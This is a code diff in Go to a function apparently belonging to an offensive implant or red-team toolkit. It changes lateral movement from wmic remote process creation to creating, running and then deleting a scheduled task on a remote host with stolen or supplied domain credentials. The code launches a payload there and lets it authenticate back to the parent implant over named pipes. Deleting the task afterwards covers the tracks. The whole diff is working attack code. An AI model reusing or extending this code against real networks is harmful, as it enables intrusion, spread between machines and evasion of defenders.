@@ -281,20 +281,30 @@ func lateralWMI(host string, data []byte, svcName, user, pass string) (string, e
 		return "", fmt.Errorf("wmi: %w", err)
 	}
 
-	var cmd string
+	// Use schtasks with explicit domain-user credentials so the child process
+	// runs as the provided account (not SYSTEM/machine-account), enabling
+	// cross-domain named-pipe auth back to the parent.
+	sch := func(subCmd string) (string, error) {
+		var fullCmd string
+		if user != "" && pass != "" {
+			fullCmd = fmt.Sprintf(`schtasks %s /S "%s" /U "%s" /P "%s"`, subCmd, host, user, pass)
+		} else {
+			fullCmd = fmt.Sprintf(`schtasks %s /S "%s"`, subCmd, host)
+		}
+		return runShell(fullCmd)
+	}
+	ruAs := "/RU SYSTEM"
 	if user != "" && pass != "" {
-		dom, usr := splitDomainUser(user)
-		cmd = fmt.Sprintf(`wmic /node:"%s" /user:"%s\\%s" /password:"%s" process call create "%s"`,
-			host, dom, usr, pass, localPath)
-	} else {
-		cmd = fmt.Sprintf(`wmic /node:"%s" process call create "%s"`, host, localPath)
+		ruAs = fmt.Sprintf(`/RU "%s" /RP "%s"`, user, pass)
 	}
-
-	out, err := runShell(cmd)
-	if err != nil {
-		return out, fmt.Errorf("wmi %s: %s: %w", host, strings.TrimSpace(out), err)
+	st := time.Now().Add(2 * time.Minute).Format("15:04")
+	createArgs := fmt.Sprintf(`/Create /TN "%s" /TR "%s" /SC ONCE /ST %s %s /F`, svcName, localPath, st, ruAs)
+	if out, err := sch(createArgs); err != nil {
+		return out, fmt.Errorf("wmi create task %s: %w", host, err)
 	}
-	return fmt.Sprintf("[+] wmi → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
+	runOut, _ := sch(fmt.Sprintf(`/Run /TN "%s"`, svcName))
+	sch(fmt.Sprintf(`/Delete /TN "%s" /F`, svcName)) //nolint:errcheck
+	return fmt.Sprintf("[+] wmi → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(runOut)), nil
 }
 
 // ─�� winrmExec (lateral variant) ───────────────────────────────────────────────
